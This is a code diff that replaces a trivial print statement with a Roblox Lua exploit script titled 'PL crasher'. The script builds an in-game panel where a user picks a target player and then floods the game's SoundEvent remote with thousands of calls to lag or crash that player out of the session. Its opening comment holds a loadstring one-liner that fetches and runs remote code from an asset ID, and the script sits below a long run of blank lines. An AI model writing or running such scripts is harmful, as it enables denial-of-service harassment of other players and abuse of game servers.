@@ -1,1 +1,285 @@
-print("Hiiii")
+--Link: loadstring(game:GetObjects("rbxassetid://16524932380")[1].Source)()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if game:GetService("CoreGui"):FindFirstChild("CrasherMain") ~= nil then
+	game:GetService("CoreGui"):FindFirstChild("CrasherMain"):Destroy()
+end
+local CrasherMain = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Playerbox = Instance.new("TextBox")
+local Display = Instance.new("TextLabel")
+local Kaboom = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local Creds = Instance.new("TextLabel")
+local Intensity = Instance.new("TextBox")
+
+--Properties:
+
+CrasherMain.Name = "CrasherMain"
+CrasherMain.Parent = game:GetService("CoreGui")
+CrasherMain.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Main.Name = "Main"
+Main.Parent = CrasherMain
+Main.BackgroundColor3 = Color3.fromRGB(147, 104, 45)
+Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.434540391, 0, 0.270949721, 0)
+Main.Size = UDim2.new(0, 140, 0, 163)
+
+Title.Name = "Title"
+Title.Parent = Main
+Title.BackgroundColor3 = Color3.fromRGB(65, 171, 32)
+Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(-0.000516836997, 0, -0.00524883624, 0)
+Title.Size = UDim2.new(1, 0, 0.219788447, 0)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "PL crasher"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+Playerbox.Name = "Playerbox"
+Playerbox.Parent = Main
+Playerbox.BackgroundColor3 = Color3.fromRGB(65, 171, 32)
+Playerbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Playerbox.BorderSizePixel = 0
+Playerbox.Position = UDim2.new(0.0661496818, 0, 0.422009796, 0)
+Playerbox.Size = UDim2.new(0.866666734, 0, 0.129554227, 0)
+Playerbox.Font = Enum.Font.SourceSans
+Playerbox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+Playerbox.PlaceholderText = "<Target>"
+Playerbox.Text = ""
+Playerbox.TextColor3 = Color3.fromRGB(0, 0, 0)
+Playerbox.TextScaled = true
+Playerbox.TextSize = 14.000
+Playerbox.TextWrapped = true
+
+Display.Name = "Display"
+Display.Parent = Main
+Display.BackgroundColor3 = Color3.fromRGB(65, 171, 32)
+Display.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Display.BorderSizePixel = 0
+Display.Position = UDim2.new(0.0665294081, 0, 0.595463872, 0)
+Display.Size = UDim2.new(0.866666734, 0, 0.107217357, 0)
+Display.Font = Enum.Font.SourceSans
+Display.Text = "Player: N/A"
+Display.TextColor3 = Color3.fromRGB(0, 0, 0)
+Display.TextScaled = true
+Display.TextSize = 14.000
+Display.TextWrapped = true
+Display.TextXAlignment = Enum.TextXAlignment.Left
+
+Kaboom.Name = "Kaboom"
+Kaboom.Parent = Main
+Kaboom.BackgroundColor3 = Color3.fromRGB(255, 94, 94)
+Kaboom.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Kaboom.BorderSizePixel = 0
+Kaboom.Position = UDim2.new(0.0602724366, 0, 0.740935147, 0)
+Kaboom.Size = UDim2.new(0.872923732, 0, 0.116152152, 0)
+Kaboom.Font = Enum.Font.SourceSans
+Kaboom.Text = "Lag them!"
+Kaboom.TextColor3 = Color3.fromRGB(0, 0, 0)
+Kaboom.TextScaled = true
+Kaboom.TextSize = 14.000
+Kaboom.TextWrapped = true
+
+UICorner.CornerRadius = UDim.new(1, 0)
+UICorner.Parent = Kaboom
+
+Creds.Name = "Creds"
+Creds.Parent = Main
+Creds.BackgroundColor3 = Color3.fromRGB(65, 171, 32)
+Creds.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Creds.BorderSizePixel = 0
+Creds.Position = UDim2.new(0.00662602019, 0, 0.90272665, 0)
+Creds.Size = UDim2.new(1, 0, 0.097089, 0)
+Creds.Font = Enum.Font.SourceSans
+Creds.Text = "By RobloxianGuy_"
+Creds.TextColor3 = Color3.fromRGB(0, 0, 0)
+Creds.TextScaled = true
+Creds.TextSize = 14.000
+Creds.TextWrapped = true
+Creds.TextXAlignment = Enum.TextXAlignment.Left
+
+Intensity.Name = "Intensity"
+Intensity.Parent = Main
+Intensity.BackgroundColor3 = Color3.fromRGB(65, 171, 32)
+Intensity.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Intensity.BorderSizePixel = 0
+Intensity.Position = UDim2.new(0.0732925385, 0, 0.254999995, 0)
+Intensity.Size = UDim2.new(0.866666734, 0, 0.129554227, 0)
+Intensity.Font = Enum.Font.SourceSans
+Intensity.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+Intensity.PlaceholderText = "1000 | Higher=Laggier"
+Intensity.Text = "1000"
+Intensity.TextColor3 = Color3.fromRGB(0, 0, 0)
+Intensity.TextScaled = true
+Intensity.TextSize = 14.000
+Intensity.TextWrapped = true
+
+Main.Active=true 
+Main.Draggable=true
+
+local function GetPlayer(String)-- Credit to Timeless/xFunnieuss
+	if String==nil then return nil end
+	if typeof(String)~="string"then return nil end
+	local Found={}
+	local strl=String:lower()
+	if strl=="all"then
+		for i,v in pairs(game:Service("Players"):GetPlayers())do
+			table.insert(Found,v)
+		end
+	elseif strl=="others"then
+		for i,v in pairs(game:Service("Players"):GetPlayers())do
+			if v.Name~=game:GetService("Players").LocalPlayer.Name then
+				table.insert(Found,v)
+			end
+		end  
+	elseif strl=="me"then
+		for i,v in pairs(game:Service("Players"):GetPlayers())do
+			if v.Name==game:GetService("Players").LocalPlayer.Name then
+				table.insert(Found,v)
+			end
+		end 
+	else
+		for i,v in pairs(game:Service("Players"):GetPlayers())do
+			if v.Name:lower():sub(1, #String)==String:lower()then
+				table.insert(Found,v)
+			elseif v.DisplayName~=nil then
+				if v.DisplayName:lower():sub(1, #String)==String:lower()then
+					table.insert(Found,v)
+				end
+			end
+		end  
+	end
+	return Found  
+end
+
+local Victim = nil
+
+Playerbox.FocusLost:Connect(function()
+	Victim=GetPlayer(Playerbox.Text)[1]
+	if Victim ~= nil then
+		Display.Text=`Player: {Victim.Name}`
+	end
+end)
+
+local SEvent = game:GetService("ReplicatedStorage").SoundEvent
+
+Kaboom.MouseButton1Click:Connect(function()
+	local S = nil
+	local Target = Victim
+	if Target ~= nil then
+		local H = Instance.new("Hint",workspace)
+		H.Text=`Lagging player out...`
+		local success=false
+		for i=0,40 do
+			H.Text=`Lagging {Target.Name} out... ({i}/40)`
+			if not Target:IsDescendantOf(game:GetService("Players")) then
+				success=true
+				break
+			end
+
+			S = Target.Character.Head.punchSound
+			for i=0, math.min(tonumber(Intensity.Text)or 1000,50000) do
+				SEvent:FireServer(S)
+			end
+
+			wait(2)
+		end
+		if success then
+			H.Text=`{Target.Name} has left or crashed!`
+		else
+			H.Text=`Failed to lag {Target.Name} them out!`
+		end
+		wait(3)
+		H:Destroy()
+	end
+end)
